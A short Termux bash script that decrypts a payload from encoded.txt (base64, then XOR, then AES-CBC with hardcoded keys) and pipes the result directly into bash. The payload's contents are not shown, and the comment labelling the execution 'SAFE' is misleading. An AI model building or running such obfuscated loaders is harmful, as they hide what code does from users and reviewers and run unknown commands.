#!/data/data/com.termux/files/usr/bin/bash

# ENCODED PAYLOAD
ENCODED_SCRIPT="$(cat encoded.txt)"

python3 - <<END
import base64, hashlib, subprocess
from Crypto.Cipher import AES

payload = """$ENCODED_SCRIPT"""
password_aes = "myaeszpxel"
key_xor = b"myxorzpxel"

try:
    data = base64.b64decode(payload)

    iv = data[:16]
    xor_encrypted = data[16:]

    aes_encrypted = bytes([b ^ key_xor[i % len(key_xor)] for i, b in enumerate(xor_encrypted)])

    key = hashlib.sha256(password_aes.encode()).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(aes_encrypted)

    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]

    # SAFE execution
    subprocess.run(["bash"], input=plaintext.decode(), text=True)

except Exception as e:
    print("Decryption failed:", e)
END
